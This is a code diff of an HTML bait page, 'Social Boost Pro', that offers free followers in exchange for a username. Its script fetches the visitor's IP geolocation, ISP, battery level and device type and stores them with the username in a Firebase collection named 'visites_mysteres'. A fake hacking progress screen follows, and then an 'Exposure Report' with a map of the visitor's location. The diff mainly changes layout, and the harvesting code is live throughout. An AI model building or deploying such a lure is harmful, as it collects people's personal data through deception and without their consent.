@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Social Boost Pro - Global</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        /* Masquer la barre de défilement partout tout en gardant le scroll fonctionnel */
+        /* Masquer totalement la barre de défilement */
         * {
             scrollbar-width: none;
             -ms-overflow-style: none;
@@ -19,6 +19,8 @@
         body { 
             font-family: 'Outfit', sans-serif; 
             background-color: #f8fafc;
+            height: 100vh;
+            overflow: hidden; /* Verrouille l'écran */
         }
 
         .mono { font-family: 'JetBrains Mono', monospace; }
@@ -36,7 +38,7 @@
         }
         @keyframes radar-pulse {
             0% { width: 0; height: 0; opacity: 1; }
-            100% { width: 200px; height: 200px; opacity: 0; }
+            100% { width: 180px; height: 180px; opacity: 0; }
         }
 
         .scan-line {
@@ -56,8 +58,8 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 100px;
-            height: 100px;
+            width: 80px;
+            height: 80px;
             border: 2px solid rgba(239, 68, 68, 0.6);
             border-radius: 50%;
             z-index: 11;
@@ -70,10 +72,10 @@
         }
     </style>
 </head>
-<body class="bg-slate-50 flex flex-col items-center justify-center min-h-screen m-0 p-4 select-none relative overflow-hidden">
+<body class="bg-slate-50 flex flex-col items-center justify-center min-h-screen m-0 p-2 select-none relative">
 
     <!-- Language Selector -->
-    <div class="fixed top-4 right-4 z-50">
+    <div class="fixed top-3 right-3 z-50">
         <button id="lang-toggle" class="bg-white border border-slate-200 px-3 py-1.5 rounded-full text-[9px] font-black uppercase tracking-widest shadow-sm hover:bg-slate-50 transition-all flex items-center gap-2">
             <span id="lang-label">FRANÇAIS</span>
             <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
@@ -81,7 +83,7 @@
     </div>
 
     <!-- Step 1: The Bait -->
-    <div id="step-1" class="fade-in-up bg-white p-6 rounded-[2rem] shadow-2xl shadow-slate-200/50 w-full max-w-sm flex flex-col items-center border border-slate-100 z-10">
+    <div id="step-1" class="fade-in-up bg-white p-6 rounded-[2rem] shadow-2xl w-full max-w-sm flex flex-col items-center border border-slate-100 z-10">
         <div class="mb-4">
             <div class="w-16 h-16 rounded-[20px] bg-gradient-to-tr from-[#f9ce34] via-[#ee2a7b] to-[#6228d7] p-[2px] shadow-xl shadow-pink-500/20">
                 <div class="bg-white w-full h-full rounded-[18px] flex items-center justify-center text-[#ee2a7b]">
@@ -93,111 +95,101 @@
                 </div>
             </div>
         </div>
-        
         <h1 id="ui-title" class="text-xl font-black tracking-tight text-slate-900 mb-1">Social Boost Pro</h1>
-        <p id="ui-desc" class="text-xs text-slate-400 mb-6 text-center leading-relaxed px-4 text-balance text-gray-500">
+        <p id="ui-desc" class="text-xs text-slate-400 mb-6 text-center leading-relaxed px-4 text-gray-500">
             Verify your account to receive <span class="font-bold text-pink-500">+10,000 followers</span>.
         </p>
-        
         <div class="w-full space-y-3">
-            <input type="text" id="alias-input" placeholder="@your_username" 
-                   class="w-full bg-slate-50 border border-slate-200 rounded-xl px-5 py-3.5 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:border-pink-500 transition-all font-semibold">
-            
-            <button id="unlock-btn" class="w-full bg-slate-900 hover:bg-slate-800 text-white text-sm font-bold py-4 rounded-xl transition-all duration-300 shadow-lg shadow-slate-900/10 cursor-pointer">
-                Generate Followers
-            </button>
+            <input type="text" id="alias-input" placeholder="@your_username" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-5 py-3.5 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:border-pink-500 transition-all font-semibold">
+            <button id="unlock-btn" class="w-full bg-slate-900 hover:bg-slate-800 text-white text-sm font-bold py-4 rounded-xl transition-all duration-300 shadow-lg shadow-slate-900/10 cursor-pointer">Generate Followers</button>
         </div>
     </div>
 
-    <!-- Step Loading: Advanced Radar Scanner -->
+    <!-- Step Loading -->
     <div id="step-loading" class="hidden flex-col items-center justify-center z-10 w-full max-w-sm text-center">
-        <div class="relative w-40 h-40 mb-6 flex items-center justify-center">
+        <div class="relative w-36 h-36 mb-6 flex items-center justify-center">
             <div class="radar-circle" style="animation-delay: 0s"></div>
             <div class="radar-circle" style="animation-delay: 0.5s"></div>
-            <div class="radar-circle" style="animation-delay: 1s"></div>
             <div class="relative z-10 text-pink-500">
-                <svg class="w-14 h-14 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                <svg class="w-12 h-12 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
             </div>
         </div>
         <h2 id="loading-status" class="text-slate-900 font-black text-lg mb-1 tracking-tight">Accessing Database...</h2>
         <p class="mono text-[9px] text-pink-500 font-bold mb-4 uppercase tracking-widest" id="loading-percent">0%</p>
-        <div id="loading-logs" class="mono text-[8px] text-slate-400 space-y-1 h-10 overflow-hidden"></div>
     </div>
 
-    <!-- Step 2: The Final Reveal (Compact) -->
-    <div id="step-2" class="hidden bg-white p-5 rounded-[1.5rem] shadow-2xl w-full max-w-md flex flex-col items-center border border-red-500/20 z-10 fade-in-up">
-        <div id="ui-alert-badge" class="inline-flex items-center gap-2 bg-red-50 text-red-600 px-3 py-1 rounded-full text-[8px] font-black uppercase tracking-[0.2em] mb-4 border border-red-100 text-center">
+    <!-- Step 2: The Final Reveal (Condensed for One-Screen Impact) -->
+    <div id="step-2" class="hidden bg-white p-4 rounded-[1.5rem] shadow-2xl w-full max-w-sm flex flex-col items-center border border-red-500/20 z-10 fade-in-up">
+        <div id="ui-alert-badge" class="inline-flex items-center gap-2 bg-red-50 text-red-600 px-3 py-1 rounded-full text-[8px] font-black uppercase tracking-[0.2em] mb-3 border border-red-100 text-center">
             <span class="w-1.5 h-1.5 bg-red-600 rounded-full animate-pulse"></span>
             Security Compromised
         </div>
 
-        <h2 id="ui-alert-title" class="text-xl font-black text-slate-900 mb-0.5">Exposure Report</h2>
-        <p id="ui-alert-desc" class="text-slate-400 text-[10px] mb-4 text-center px-4 text-gray-500 leading-tight">Private data extracted upon interaction.</p>
+        <h2 id="ui-alert-title" class="text-lg font-black text-slate-900 mb-0.5">Exposure Report</h2>
+        <p id="ui-alert-desc" class="text-slate-400 text-[9px] mb-3 text-center px-4 leading-tight">Private data extracted upon interaction.</p>
 
-        <div class="w-full space-y-2 mb-4">
-            <!-- Row 1: ID & Timestamp -->
-            <div class="grid grid-cols-2 gap-2">
-                <div class="bg-slate-50 border border-slate-100 rounded-xl p-2.5 flex flex-col justify-center">
-                    <span id="ui-label-name" class="text-[8px] font-bold text-slate-400 uppercase tracking-widest mb-0.5">Snatched ID</span>
-                    <span id="display-name" class="text-xs font-bold text-slate-900 truncate">...</span>
+        <div class="w-full space-y-1.5">
+            <!-- Row 1: ID & Date -->
+            <div class="grid grid-cols-2 gap-1.5">
+                <div class="bg-slate-50 border border-slate-100 rounded-xl p-2 flex flex-col">
+                    <span id="ui-label-name" class="text-[7px] font-bold text-slate-400 uppercase tracking-widest mb-0.5 text-gray-400">Identity</span>
+                    <span id="display-name" class="text-[11px] font-bold text-slate-900 truncate">...</span>
                 </div>
-                <div class="bg-slate-50 border border-slate-100 rounded-xl p-2.5 flex flex-col justify-center">
-                    <span id="ui-label-date" class="text-[8px] font-bold text-slate-400 uppercase tracking-widest mb-0.5">Timestamp</span>
+                <div class="bg-slate-50 border border-slate-100 rounded-xl p-2 flex flex-col">
+                    <span id="ui-label-date" class="text-[7px] font-bold text-slate-400 uppercase tracking-widest mb-0.5 text-gray-400">Capture</span>
                     <span id="display-date" class="text-[9px] font-bold text-slate-900 mono">...</span>
                 </div>
             </div>
 
             <!-- Row 2: IP & ISP -->
-            <div class="bg-slate-50 border border-slate-100 rounded-xl p-3 flex justify-between items-center">
+            <div class="bg-slate-50 border border-slate-100 rounded-xl p-2 flex justify-between items-center">
                 <div class="flex flex-col min-w-0">
-                    <span id="ui-label-ip" class="text-[8px] font-bold text-slate-400 uppercase tracking-widest">Network Address</span>
-                    <span id="display-ip" class="text-xs font-bold text-blue-600 mono break-all">...</span>
+                    <span id="ui-label-ip" class="text-[7px] font-bold text-slate-400 uppercase tracking-widest text-gray-400 text-[10px]">Network Address</span>
+                    <span id="display-ip" class="text-[11px] font-bold text-blue-600 mono break-all">...</span>
                 </div>
-                <div class="text-right flex flex-col min-w-0 ml-4">
-                    <span id="ui-label-isp" class="text-[8px] text-slate-400 uppercase font-bold tracking-widest">Provider</span>
-                    <span id="display-isp" class="text-[9px] font-bold text-pink-500 truncate max-w-[100px]">...</span>
+                <div class="text-right flex flex-col min-w-0 ml-2">
+                    <span id="ui-label-isp" class="text-[7px] text-slate-400 uppercase font-bold tracking-widest text-gray-400">Provider</span>
+                    <span id="display-isp" class="text-[9px] font-bold text-pink-500 truncate max-w-[80px]">...</span>
                 </div>
             </div>
 
-            <!-- Row 3: Battery & OS -->
-            <div class="grid grid-cols-2 gap-2">
-                <div class="bg-slate-50 border border-slate-100 rounded-xl p-2.5 flex items-center gap-3">
+            <!-- Row 3: Battery & Device -->
+            <div class="grid grid-cols-2 gap-1.5">
+                <div class="bg-slate-50 border border-slate-100 rounded-xl p-2 flex items-center gap-2">
                     <div id="battery-icon-container" class="text-green-500 shrink-0"></div>
                     <div class="flex flex-col">
-                        <span id="ui-label-batt" class="text-[7px] font-bold text-slate-400 uppercase">Batt</span>
-                        <span id="display-battery" class="text-xs font-bold text-slate-800">...</span>
+                        <span id="ui-label-batt" class="text-[7px] font-bold text-slate-400 uppercase text-gray-400">Batt</span>
+                        <span id="display-battery" class="text-[11px] font-bold text-slate-800">...</span>
                     </div>
                 </div>
-                <div class="bg-slate-50 border border-slate-100 rounded-xl p-2.5 flex items-center gap-3">
+                <div class="bg-slate-50 border border-slate-100 rounded-xl p-2 flex items-center gap-2">
                     <div id="os-icon-container" class="text-slate-400 shrink-0"></div>
                     <div class="flex flex-col truncate">
-                        <span id="ui-label-os" class="text-[7px] font-bold text-slate-400 uppercase">Device</span>
+                        <span id="ui-label-os" class="text-[7px] font-bold text-slate-400 uppercase text-gray-400">Device</span>
                         <span id="display-system" class="text-[10px] font-bold text-slate-800 truncate">...</span>
                     </div>
                 </div>
             </div>
 
-            <!-- Google Map -->
-            <div class="relative w-full h-32 bg-slate-200 rounded-[1rem] overflow-hidden border border-slate-200 shadow-inner">
+            <!-- Google Map (Slightly smaller for one-screen) -->
+            <div class="relative w-full h-28 bg-slate-200 rounded-[1rem] overflow-hidden border border-slate-200 shadow-inner">
                 <div class="scan-line"></div><div class="target-circle"></div>
                 <iframe id="display-map" width="100%" height="100%" frameborder="0" style="border:0;" src="" loading="lazy"></iframe>
             </div>
 
             <!-- Flag & Location -->
-            <div class="bg-slate-900 p-3 rounded-xl flex items-center justify-center gap-2 text-white">
+            <div class="bg-slate-900 p-2.5 rounded-xl flex items-center justify-center gap-2 text-white">
                 <img id="display-flag" src="" alt="Flag" class="hidden w-4 h-2.5 object-cover rounded-sm">
-                <span id="display-location" class="text-[10px] font-bold uppercase tracking-widest">...</span>
+                <span id="display-location" class="text-[9px] font-bold uppercase tracking-widest truncate">...</span>
             </div>
         </div>
 
-        <p id="ui-final-warning" class="text-[9px] font-bold text-slate-400 italic">Caution: Looks can be deceiving.</p>
+        <p id="ui-final-warning" class="text-[8px] font-bold text-slate-400 italic mt-3">Caution: Looks can be deceiving.</p>
     </div>
 
-    <!-- Professional Signature -->
-    <div class="mt-4 text-center pb-2">
-        <p class="text-[8px] tracking-[0.4em] text-slate-400 uppercase font-black">
-            Secured by <span class="text-slate-900 font-bold text-gray-600">LevelUp</span>
-        </p>
+    <!-- Signature -->
+    <div class="mt-4 text-center">
+        <p class="text-[8px] tracking-[0.4em] text-slate-400 uppercase font-black">Secured by <span class="text-slate-900">LevelUp</span></p>
     </div>
 
     <script type="module">
@@ -218,28 +210,14 @@
 
         const translations = {
             en: {
-                toggle: "FRANÇAIS", title: "Social Boost Pro",
-                desc: "Verify your account to receive <span class='font-bold text-pink-500'>+10,000 followers</span>.",
-                placeholder: "@your_username", button: "Generate Followers",
-                alertBadge: "Security Compromised", alertTitle: "Exposure Report",
-                alertDesc: "Private data extracted upon interaction.",
-                labelDate: "Timestamp", labelName: "Snatched ID", labelIp: "Network Address",
-                labelBatt: "Batt", labelOs: "Device", labelIsp: "Provider",
-                finalWarning: "Caution: Looks can be deceiving.",
-                loadingSteps: ["Accessing DB...", "Bypassing Security...", "Injecting Nodes...", "Syncing Data..."],
-                logs: ["PING_SERVER", "SSL_BYPASS", "PACKET_SEND", "FINALIZING"]
+                toggle: "FRANÇAIS", title: "Social Boost Pro", desc: "Verify your account to receive <span class='font-bold text-pink-500'>+10,000 followers</span>.", placeholder: "@your_username", button: "Generate Followers",
+                alertBadge: "Security Compromised", alertTitle: "Exposure Report", alertDesc: "Private data extracted upon interaction.", labelDate: "Capture", labelName: "Identity", labelIp: "Network Address", labelBatt: "Batt", labelOs: "Device", labelIsp: "Provider", finalWarning: "Caution: Looks can be deceiving.",
+                loadingSteps: ["Accessing DB...", "Bypassing Security...", "Injecting Nodes...", "Syncing Data..."], logs: ["PING_SERVER", "SSL_BYPASS", "PACKET_SEND", "FINALIZING"]
             },
             fr: {
-                toggle: "ENGLISH", title: "Social Boost Pro",
-                desc: "Vérifiez votre compte pour recevoir <span class='font-bold text-pink-500'>+10 000 abonnés</span>.",
-                placeholder: "@votre_pseudo", button: "Générer les abonnés",
-                alertBadge: "Sécurité Compromise", alertTitle: "Rapport d'Exposition",
-                alertDesc: "Données privées extraites après interaction.",
-                labelDate: "Capture", labelName: "Identité", labelIp: "Adresse Réseau",
-                labelBatt: "Batt", labelOs: "Modèle", labelIsp: "Opérateur",
-                finalWarning: "Attention : L'habit ne fait pas le moine.",
-                loadingSteps: ["Accès DB...", "Contournement Sécu...", "Injection Noeuds...", "Sync Données..."],
-                logs: ["PING_SERVEUR", "SSL_BYPASS", "ENVOI_PAQUETS", "FINALISATION"]
+                toggle: "ENGLISH", title: "Social Boost Pro", desc: "Vérifiez votre compte pour recevoir <span class='font-bold text-pink-500'>+10 000 abonnés</span>.", placeholder: "@votre_pseudo", button: "Générer les abonnés",
+                alertBadge: "Sécurité Compromise", alertTitle: "Rapport d'Exposition", alertDesc: "Données privées extraites après interaction.", labelDate: "Capture", labelName: "Identité", labelIp: "Réseau", labelBatt: "Batt", labelOs: "Modèle", labelIsp: "Opérateur", finalWarning: "Attention : L'habit ne fait pas le moine.",
+                loadingSteps: ["Accès DB...", "Contournement Sécu...", "Injection Noeuds...", "Sync Données..."], logs: ["PING_SERVEUR", "SSL_BYPASS", "ENVOI_PAQUETS", "FINALISATION"]
             }
         };
 
@@ -270,45 +248,36 @@
         });
 
         const osIcons = {
-            iphone: `<svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.1 2.48-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83zM13 3.5c.73-.89 1.22-2.14 1.08-3.38-1.06.04-2.34.71-3.1 1.6-.68.79-1.28 2.06-1.12 3.26 1.18.09 2.39-.59 3.14-1.48z"/></svg>`,
-            android: `<svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M17.523 15.3414C17.0609 15.3414 16.6917 14.9723 16.6917 14.5101C16.6917 14.048 17.0609 13.6788 17.523 13.6788C17.9852 13.6788 18.3543 14.048 18.3543 14.5101C18.3543 14.9723 17.9852 15.3414 17.523 15.3414ZM6.47611 15.3414C6.01402 15.3414 5.64478 14.9723 5.64478 14.5101C5.64478 14.048 6.01402 13.6788 6.47611 13.6788C6.93836 13.6788 7.30744 14.048 7.30744 14.5101C7.30744 14.9723 6.93836 15.3414 6.47611 15.3414ZM17.9252 10.7412L19.7891 7.51352C19.897 7.32671 19.8329 7.08779 19.6462 6.97987C19.4594 6.87187 19.2204 6.93602 19.1124 7.12283L17.221 10.397C15.7196 9.71181 14.0041 9.32432 12.1994 9.32432C10.3948 9.32432 8.67931 9.71181 7.17792 10.397L5.28652 7.12283C5.17852 6.93602 4.93952 6.87187 4.75271 6.97987C4.56598 7.08779 4.50191 7.32671 4.60991 7.51352L6.47371 10.7412C2.86872 12.6953 0.444336 16.3776 0.444336 20.6757H23.9546C23.9546 16.3776 21.5302 12.6953 17.9252 10.7412Z"/></svg>`,
-            windows: `<svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M0 3.449L9.75 2.1V11.7H0V3.449zm0 17.102L9.75 21.9V12.3H0v8.251zM11.25 1.899L24 0v11.7H11.25V1.899zm12.75 22.101L11.25 22.2V12.3H24v11.7z"/></svg>`,
-            default: `<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>`
+            iphone: `<svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.1 2.48-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83zM13 3.5c.73-.89 1.22-2.14 1.08-3.38-1.06.04-2.34.71-3.1 1.6-.68.79-1.28 2.06-1.12 3.26 1.18.09 2.39-.59 3.14-1.48z"/></svg>`,
+            android: `<svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M17.523 15.3414C17.0609 15.3414 16.6917 14.9723 16.6917 14.5101C16.6917 14.048 17.0609 13.6788 17.523 13.6788C17.9852 13.6788 18.3543 14.048 18.3543 14.5101C18.3543 14.9723 17.9852 15.3414 17.523 15.3414ZM6.47611 15.3414C6.01402 15.3414 5.64478 14.9723 5.64478 14.5101C5.64478 14.048 6.01402 13.6788 6.47611 13.6788C6.93836 13.6788 7.30744 14.048 7.30744 14.5101C7.30744 14.9723 6.93836 15.3414 6.47611 15.3414ZM17.9252 10.7412L19.7891 7.51352C19.897 7.32671 19.8329 7.08779 19.6462 6.97987C19.4594 6.87187 19.2204 6.93602 19.1124 7.12283L17.221 10.397C15.7196 9.71181 14.0041 9.32432 12.1994 9.32432C10.3948 9.32432 8.67931 9.71181 7.17792 10.397L5.28652 7.12283C5.17852 6.93602 4.93952 6.87187 4.75271 6.97987C4.56598 7.08779 4.50191 7.32671 4.60991 7.51352L6.47371 10.7412C2.86872 12.6953 0.444336 16.3776 0.444336 20.6757H23.9546C23.9546 16.3776 21.5302 12.6953 17.9252 10.7412Z"/></svg>`,
+            windows: `<svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M0 3.449L9.75 2.1V11.7H0V3.449zm0 17.102L9.75 21.9V12.3H0v8.251zM11.25 1.899L24 0v11.7H11.25V1.899zm12.75 22.101L11.25 22.2V12.3H24v11.7z"/></svg>`,
+            default: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>`
         };
 
         function getDetailedDeviceInfo() {
             const ua = navigator.userAgent;
-            let name = "Unknown Device";
-            let icon = osIcons.default;
-            if (/iPhone|iPad|iPod/i.test(ua)) { name = "Apple iPhone / iPad"; icon = osIcons.iphone; }
+            let name = "Desktop PC"; let icon = osIcons.windows;
+            if (/iPhone|iPad|iPod/i.test(ua)) { name = "Apple iPhone"; icon = osIcons.iphone; }
             else if (/Android/i.test(ua)) {
                 icon = osIcons.android;
                 if (/Samsung|SM-|GT-/i.test(ua)) name = "Samsung Galaxy";
-                else if (/Huawei|Honor/i.test(ua)) name = "Huawei / Honor";
+                else if (/Huawei|Honor/i.test(ua)) name = "Huawei Device";
                 else if (/Pixel/i.test(ua)) name = "Google Pixel";
-                else if (/Redmi|Xiaomi|Mi /i.test(ua)) name = "Xiaomi / Redmi";
-                else if (/Oppo/i.test(ua)) name = "Oppo";
-                else if (/Vivo/i.test(ua)) name = "Vivo";
-                else name = "Android Smartphone";
+                else name = "Android Device";
             }
-            else if (/Windows/i.test(ua)) { name = "Windows PC"; icon = osIcons.windows; }
-            else if (/Mac/i.test(ua)) { name = "Apple MacBook / iMac"; icon = osIcons.iphone; }
             return { name, icon };
         }
 
         async function getBatterySVG(level) {
-            const color = level > 20 ? 'currentColor' : '#ef4444';
-            return `<svg class="w-4 h-4" fill="none" stroke="${color}" stroke-width="2" viewBox="0 0 24 24">
-                <rect x="2" y="7" width="16" height="10" rx="2" /><path d="M21 10v4" /><rect x="4" y="9" width="${Math.max(1, (level/100)*12)}" height="6" fill="${color}" stroke="none" />
-            </svg>`;
+            const displayLevel = isNaN(level) ? 100 : level;
+            const color = displayLevel > 20 ? 'currentColor' : '#ef4444';
+            return `<svg class="w-4 h-4" fill="none" stroke="${color}" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="7" width="16" height="10" rx="2" /><path d="M21 10v4" /><rect x="4" y="9" width="${Math.max(1, (displayLevel/100)*12)}" height="6" fill="${color}" stroke="none" /></svg>`;
         }
 
         async function enregistrerVisite(nomSaisi) {
-            let geoData = {};
-            let batteryLevel = 0;
+            let geoData = {}; let batteryLevel = "100";
             const now = new Date();
             const dateStr = now.toLocaleDateString(currentLang === 'fr' ? 'fr-FR' : 'en-US', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' });
-
             try {
                 const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                 geoData = await response.json();
@@ -316,14 +285,9 @@
                     const b = await navigator.getBattery();
                     batteryLevel = Math.round(b.level * 100);
                 }
-            } catch (e) {}
-
+            } catch (e) { batteryLevel = "100"; }
             const dev = getDetailedDeviceInfo();
-            const data = {
-                nom_cible: nomSaisi, ip: geoData.ip || "N/A", ville: geoData.city || "N/A",
-                pays: geoData.country || "N/A", isp: geoData.organization || "N/A",
-                batterie: batteryLevel + "%", os: dev.name, date_ui: dateStr, date_clic: serverTimestamp()
-            };
+            const data = { nom_cible: nomSaisi, ip: geoData.ip || "N/A", ville: geoData.city || "N/A", pays: geoData.country || "N/A", isp: geoData.organization || "N/A", batterie: batteryLevel + "%", os: dev.name, date_ui: dateStr, date_clic: serverTimestamp() };
             await addDoc(collection(db, "visites_mysteres"), data);
             return { ...geoData, batteryLevel, dev, dateStr };
         }
@@ -331,60 +295,38 @@
         document.getElementById('unlock-btn').addEventListener('click', async () => {
             const aliasInput = document.getElementById('alias-input');
             const alias = aliasInput.value.trim();
-            if (!alias) {
-                aliasInput.classList.add('input-error');
-                setTimeout(() => aliasInput.classList.remove('input-error'), 800);
-                return;
-            }
-
+            if (!alias) { aliasInput.classList.add('input-error'); setTimeout(() => aliasInput.classList.remove('input-error'), 800); return; }
             document.getElementById('step-1').classList.add('hidden');
             document.getElementById('step-loading').classList.remove('hidden');
             document.getElementById('step-loading').classList.add('flex');
-
             const dataPromise = enregistrerVisite(alias);
             const percent = document.getElementById('loading-percent');
             const status = document.getElementById('loading-status');
-            const logs = document.getElementById('loading-logs');
             const t = translations[currentLang];
-
-            for(let i=0; i<=100; i += Math.floor(Math.random() * 12) + 2) {
+            for(let i=0; i<=100; i += Math.floor(Math.random() * 15) + 5) {
                 const stepIdx = Math.floor((i/100) * t.loadingSteps.length);
                 status.textContent = t.loadingSteps[Math.min(stepIdx, t.loadingSteps.length-1)];
                 percent.textContent = Math.min(i, 100) + "%";
-                if(i % 20 === 0) {
-                    const p = document.createElement('p');
-                    p.textContent = `> ${t.logs[Math.min(stepIdx, t.logs.length-1)]}`;
-                    logs.prepend(p);
-                }
-                await new Promise(r => setTimeout(r, 100));
+                await new Promise(r => setTimeout(r, 120));
             }
-            percent.textContent = "100%";
-
             const data = await dataPromise;
             document.getElementById('display-date').textContent = data.dateStr;
             document.getElementById('display-name').textContent = alias;
             document.getElementById('display-ip').textContent = data.ip || "127.0.0.1";
             document.getElementById('display-isp').textContent = data.organization || "Unknown";
             document.getElementById('display-battery').textContent = data.batteryLevel + "%";
-            document.getElementById('battery-icon-container').innerHTML = await getBatterySVG(data.batteryLevel);
+            document.getElementById('battery-icon-container').innerHTML = await getBatterySVG(parseInt(data.batteryLevel));
             document.getElementById('display-system').textContent = data.dev.name;
             document.getElementById('os-icon-container').innerHTML = data.dev.icon;
-            
             const locText = (data.city ? data.city + ", " : "") + (data.country || "Unknown");
             document.getElementById('display-location').textContent = locText;
             document.getElementById('display-map').src = `https://maps.google.com/maps?q=${encodeURIComponent(locText)}&t=k&z=14&ie=UTF8&iwloc=&output=embed`;
-
-            if (data.country_code) {
-                document.getElementById('display-flag').src = `https://flagcdn.com/w40/${data.country_code.toLowerCase()}.png`;
-                document.getElementById('display-flag').classList.remove('hidden');
-            }
-
+            if (data.country_code) { document.getElementById('display-flag').src = `https://flagcdn.com/w40/${data.country_code.toLowerCase()}.png`; document.getElementById('display-flag').classList.remove('hidden'); }
             if (navigator.vibrate) navigator.vibrate([100, 30, 100]);
             document.getElementById('step-loading').classList.add('hidden');
             document.getElementById('step-2').classList.remove('hidden');
             document.getElementById('step-2').classList.add('flex');
         });
-
         updateUI();
     </script>
 </body>
